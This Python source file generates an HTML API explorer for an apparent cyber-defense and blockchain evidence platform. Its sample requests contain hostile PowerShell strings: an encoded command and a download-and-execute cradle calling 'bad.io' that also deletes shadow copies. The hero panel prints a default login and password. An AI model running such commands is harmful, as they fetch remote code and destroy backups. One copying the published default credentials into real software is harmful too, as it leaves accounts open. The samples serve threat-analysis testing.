"""Interactive API Documentation & Explorer HTML Generator for Sentinel Chain."""

def get_api_docs_html() -> str:
    return """<!DOCTYPE html>
<html lang="en" class="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sentinel Chain REST API & Explorer</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Space+Grotesk:wght@500;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #090d16;
      --surface: #0f172a;
      --surface-elevated: #1e293b;
      --border: #1e293b;
      --border-accent: #3b82f6;
      --text: #f8fafc;
      --text-muted: #94a3b8;
      --blue: #38bdf8;
      --cyan: #06b6d4;
      --green: #10b981;
      --purple: #a855f7;
      --red: #ef4444;
      --orange: #f97316;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background-color: var(--bg);
      color: var(--text);
      font-family: 'Inter', sans-serif;
      line-height: 1.5;
      padding-bottom: 60px;
    }
    header {
      background: linear-gradient(180deg, rgba(15,23,42,0.95) 0%, rgba(9,13,22,0.95) 100%);
      border-bottom: 1px solid var(--border);
      padding: 24px 32px;
      position: sticky;
      top: 0;
      z-index: 50;
      backdrop-filter: blur(12px);
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .logo-group { display: flex; align-items: center; gap: 14px; }
    .badge {
      background: rgba(56, 189, 248, 0.1);
      color: var(--blue);
      border: 1px solid rgba(56, 189, 248, 0.3);
      padding: 4px 10px;
      border-radius: 999px;
      font-size: 11px;
      font-family: 'JetBrains Mono', monospace;
      font-weight: 600;
    }
    .nav-links { display: flex; gap: 12px; }
    .btn {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      padding: 8px 16px;
      border-radius: 8px;
      font-size: 13px;
      font-weight: 600;
      text-decoration: none;
      cursor: pointer;
      border: 1px solid transparent;
      transition: all 0.2s;
    }
    .btn-primary { background: #0284c7; color: white; }
    .btn-primary:hover { background: #0369a1; }
    .btn-secondary { background: var(--surface-elevated); color: var(--text); border-color: var(--border); }
    .btn-secondary:hover { background: #334155; }
    .container { max-width: 1200px; margin: 32px auto; padding: 0 24px; }
    .hero {
      background: radial-gradient(circle at top right, rgba(56,189,248,0.1), transparent 50%),
                  radial-gradient(circle at top left, rgba(168,85,247,0.1), transparent 50%),
                  var(--surface);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 32px;
      margin-bottom: 32px;
    }
    .hero h1 { font-family: 'Space Grotesk', sans-serif; font-size: 28px; margin-bottom: 8px; }
    .hero p { color: var(--text-muted); font-size: 15px; max-width: 800px; }
    .stats-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 16px;
      margin-top: 24px;
    }
    .stat-card {
      background: rgba(15, 23, 42, 0.6);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 16px;
    }
    .stat-label { font-size: 11px; color: var(--text-muted); text-transform: uppercase; font-family: 'JetBrains Mono', monospace; }
    .stat-value { font-size: 20px; font-weight: 700; color: var(--text); margin-top: 4px; font-family: 'Space Grotesk', sans-serif; }
    .section-title {
      font-family: 'Space Grotesk', sans-serif;
      font-size: 20px;
      margin: 36px 0 16px;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .endpoint-card {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 10px;
      margin-bottom: 12px;
      overflow: hidden;
      transition: border-color 0.2s;
    }
    .endpoint-card:hover { border-color: rgba(56, 189, 248, 0.4); }
    .endpoint-header {
      padding: 14px 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      cursor: pointer;
      user-select: none;
    }
    .method-tag {
      font-family: 'JetBrains Mono', monospace;
      font-weight: 700;
      font-size: 11px;
      padding: 4px 8px;
      border-radius: 6px;
      min-width: 60px;
      text-align: center;
    }
    .method-GET { background: rgba(56, 189, 248, 0.15); color: var(--blue); }
    .method-POST { background: rgba(16, 185, 129, 0.15); color: var(--green); }
    .method-PATCH { background: rgba(249, 115, 22, 0.15); color: var(--orange); }
    .endpoint-path {
      font-family: 'JetBrains Mono', monospace;
      font-size: 14px;
      margin-left: 12px;
      color: var(--text);
      flex: 1;
    }
    .endpoint-desc { color: var(--text-muted); font-size: 13px; margin-right: 16px; }
    .endpoint-body {
      padding: 20px;
      border-top: 1px solid var(--border);
      background: rgba(9, 13, 22, 0.5);
      display: none;
    }
    .endpoint-body.open { display: block; }
    pre {
      background: #050811;
      border: 1px solid var(--border);
      padding: 14px;
      border-radius: 8px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 12px;
      overflow-x: auto;
      color: #38bdf8;
      margin-top: 10px;
    }
    .btn-test {
      background: #1e293b;
      border: 1px solid #334155;
      color: #38bdf8;
      padding: 6px 14px;
      border-radius: 6px;
      font-size: 12px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 12px;
      transition: all 0.2s;
    }
    .btn-test:hover { background: #0284c7; color: white; }
  </style>
</head>
<body>
  <header>
    <div class="logo-group">
      <div style="font-size: 22px;">🛡️</div>
      <div>
        <h2 style="font-family:'Space Grotesk',sans-serif;font-size:18px;">Sentinel Chain API</h2>
        <span style="font-size:11px;color:var(--text-muted);">Post-Quantum AI Defense & Blockchain Ledger</span>
      </div>
      <span class="badge">v3.8 • ONLINE</span>
    </div>
    <div class="nav-links">
      <a href="/" class="btn btn-primary">Open Web Platform</a>
      <a href="/api/health" class="btn btn-secondary" target="_blank">Health Status</a>
    </div>
  </header>

  <div class="container">
    <div class="hero">
      <h1>Autonomous Cyber Defense REST API</h1>
      <p>Zero-dependency, multi-threaded high-concurrency API server providing AI incident prediction, SHA-256 blockchain evidence anchoring, live threat streaming, and SOC operations.</p>
      <div class="stats-grid">
        <div class="stat-card">
          <div class="stat-label">Active Ledger</div>
          <div class="stat-value">Block #585,231+</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">Validator Peers</div>
          <div class="stat-value">4 Byzantine Nodes</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">AI Engine</div>
          <div class="stat-value">GNN + XGBoost Ensemble</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">Default Credentials</div>
          <div class="stat-value" style="font-size:14px;font-family:'JetBrains Mono',monospace;">riya.singh@sentinelchain.io / Sentinel@2026!</div>
        </div>
      </div>
    </div>

    <!-- AUTHENTICATION -->
    <div class="section-title">🔑 Authentication & Users</div>
    
    <div class="endpoint-card">
      <div class="endpoint-header" onclick="toggleEndpoint(this)">
        <span class="method-tag method-POST">POST</span>
        <span class="endpoint-path">/api/auth/login</span>
        <span class="endpoint-desc">Authenticate and receive HMAC-SHA256 JWT</span>
      </div>
      <div class="endpoint-body">
        <p style="font-size:13px;color:var(--text-muted);">Request Payload:</p>
        <pre>{\n  "email": "riya.singh@sentinelchain.io",\n  "password": "Sentinel@2026!"\n}</pre>
        <button class="btn-test" onclick="runTest('POST', '/api/auth/login', {'email': 'riya.singh@sentinelchain.io', 'password': 'Sentinel@2026!'}, this)">Execute Request</button>
        <div class="test-result"></div>
      </div>
    </div>

    <div class="endpoint-card">
      <div class="endpoint-header" onclick="toggleEndpoint(this)">
        <span class="method-tag method-GET">GET</span>
        <span class="endpoint-path">/api/auth/me</span>
        <span class="endpoint-desc">Get current authenticated user session</span>
      </div>
      <div class="endpoint-body">
        <button class="btn-test" onclick="runTest('GET', '/api/auth/me', null, this)">Execute Request</button>
        <div class="test-result"></div>
      </div>
    </div>

    <!-- DASHBOARD -->
    <div class="section-title">📊 Dashboard & Posture Metrics</div>

    <div class="endpoint-card">
      <div class="endpoint-header" onclick="toggleEndpoint(this)">
        <span class="method-tag method-GET">GET</span>
        <span class="endpoint-path">/api/dashboard/stats</span>
        <span class="endpoint-desc">Retrieve composite SOC posture, MTTD, MTTR, threat score</span>
      </div>
      <div class="endpoint-body">
        <button class="btn-test" onclick="runTest('GET', '/api/dashboard/stats', null, this)">Execute Request</button>
        <div class="test-result"></div>
      </div>
    </div>

    <div class="endpoint-card">
      <div class="endpoint-header" onclick="toggleEndpoint(this)">
        <span class="method-tag method-GET">GET</span>
        <span class="endpoint-path">/api/dashboard/geo-threats</span>
        <span class="endpoint-desc">Active attack coordinates for global threat map</span>
      </div>
      <div class="endpoint-body">
        <button class="btn-test" onclick="runTest('GET', '/api/dashboard/geo-threats', null, this)">Execute Request</button>
        <div class="test-result"></div>
      </div>
    </div>

    <!-- THREATS -->
    <div class="section-title">⚡ Live Threats & Autonomous Actions</div>

    <div class="endpoint-card">
      <div class="endpoint-header" onclick="toggleEndpoint(this)">
        <span class="method-tag method-GET">GET</span>
        <span class="endpoint-path">/api/threats</span>
        <span class="endpoint-desc">List active threats with status/severity filters</span>
      </div>
      <div class="endpoint-body">
        <button class="btn-test" onclick="runTest('GET', '/api/threats', null, this)">Execute Request</button>
        <div class="test-result"></div>
      </div>
    </div>

    <div class="endpoint-card">
      <div class="endpoint-header" onclick="toggleEndpoint(this)">
        <span class="method-tag method-POST">POST</span>
        <span class="endpoint-path">/api/threats</span>
        <span class="endpoint-desc">Ingest live telemetry log or suspicious sample</span>
      </div>
      <div class="endpoint-body">
        <pre>{\n  "title": "Suspicious PowerShell Ingress",\n  "targetAsset": "Server-02",\n  "rawPayload": "powershell.exe -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQp",\n  "severity": "critical"\n}</pre>
        <button class="btn-test" onclick="runTest('POST', '/api/threats', {'title': 'Suspicious PowerShell Ingress', 'targetAsset': 'Server-02', 'rawPayload': 'powershell.exe -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQp', 'severity': 'critical'}, this)">Execute Ingestion</button>
        <div class="test-result"></div>
      </div>
    </div>

    <!-- BLOCKCHAIN -->
    <div class="section-title">🔗 Blockchain Evidence Assurance</div>

    <div class="endpoint-card">
      <div class="endpoint-header" onclick="toggleEndpoint(this)">
        <span class="method-tag method-GET">GET</span>
        <span class="endpoint-path">/api/blockchain/evidence</span>
        <span class="endpoint-desc">Query ledger evidence records with cryptographic proofs</span>
      </div>
      <div class="endpoint-body">
        <button class="btn-test" onclick="runTest('GET', '/api/blockchain/evidence', null, this)">Execute Request</button>
        <div class="test-result"></div>
      </div>
    </div>

    <div class="endpoint-card">
      <div class="endpoint-header" onclick="toggleEndpoint(this)">
        <span class="method-tag method-GET">GET</span>
        <span class="endpoint-path">/api/blockchain/audit-chain</span>
        <span class="endpoint-desc">Verify entire ledger from Genesis to Tip for tamper-evidence</span>
      </div>
      <div class="endpoint-body">
        <button class="btn-test" onclick="runTest('GET', '/api/blockchain/audit-chain', null, this)">Execute Audit</button>
        <div class="test-result"></div>
      </div>
    </div>

    <div class="endpoint-card">
      <div class="endpoint-header" onclick="toggleEndpoint(this)">
        <span class="method-tag method-POST">POST</span>
        <span class="endpoint-path">/api/blockchain/anchor</span>
        <span class="endpoint-desc">Anchor a forensic package into a newly mined block</span>
      </div>
      <div class="endpoint-body">
        <pre>{\n  "incidentId": "INC-1024",\n  "validator": "Org1-Peer0",\n  "payload": {"diskDumpHash": "0x4a9f...e201", "operator": "Riya Singh"}\n}</pre>
        <button class="btn-test" onclick="runTest('POST', '/api/blockchain/anchor', {'incidentId': 'INC-1024', 'validator': 'Org1-Peer0', 'payload': {'diskDumpHash': '0x4a9fe201', 'operator': 'Riya Singh'}}, this)">Anchor Forensics</button>
        <div class="test-result"></div>
      </div>
    </div>

    <!-- AI DEFENSE -->
    <div class="section-title">🧠 AI Prediction & Heuristics</div>

    <div class="endpoint-card">
      <div class="endpoint-header" onclick="toggleEndpoint(this)">
        <span class="method-tag method-POST">POST</span>
        <span class="endpoint-path">/api/ai/analyze-sample</span>
        <span class="endpoint-desc">Real-time Shannon entropy & MITRE ATT&CK correlation</span>
      </div>
      <div class="endpoint-body">
        <pre>{\n  "sample": "powershell.exe /c Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bad.io/x'); vssadmin delete shadows /all",\n  "target": "Finance-Server-01"\n}</pre>
        <button class="btn-test" onclick="runTest('POST', '/api/ai/analyze-sample', {'sample': 'powershell.exe /c Invoke-Expression (New-Object Net.WebClient).DownloadString(\\'http://bad.io/x\\'); vssadmin delete shadows /all', 'target': 'Finance-Server-01'}, this)">Run AI Analysis</button>
        <div class="test-result"></div>
      </div>
    </div>
  </div>

  <script>
    let authToken = '';

    function toggleEndpoint(header) {
      const body = header.nextElementSibling;
      body.classList.toggle('open');
    }

    async function runTest(method, url, data, btn) {
      const container = btn.nextElementSibling;
      container.innerHTML = '<p style="color:#94a3b8;font-size:12px;margin-top:10px;">Sending request...</p>';
      
      const headers = { 'Content-Type': 'application/json' };
      if (authToken) {
        headers['Authorization'] = 'Bearer ' + authToken;
      }

      const opts = { method, headers };
      if (data && method !== 'GET') {
        opts.body = JSON.stringify(data);
      }

      try {
        const res = await fetch(url, opts);
        const json = await res.json();

        if (json.token) {
          authToken = json.token;
        }

        container.innerHTML = `
          <div style="margin-top:12px;">
            <span style="font-family:'JetBrains Mono';font-size:12px;color:${res.ok ? '#10b981' : '#ef4444'};font-weight:700;">
              STATUS: ${res.status} ${res.statusText}
            </span>
            <pre>${JSON.stringify(json, null, 2)}</pre>
          </div>
        `;
      } catch (err) {
        container.innerHTML = `<p style="color:#ef4444;font-size:12px;margin-top:10px;">Error: ${err.message}</p>`;
      }
    }
  </script>
</body>
</html>
"""
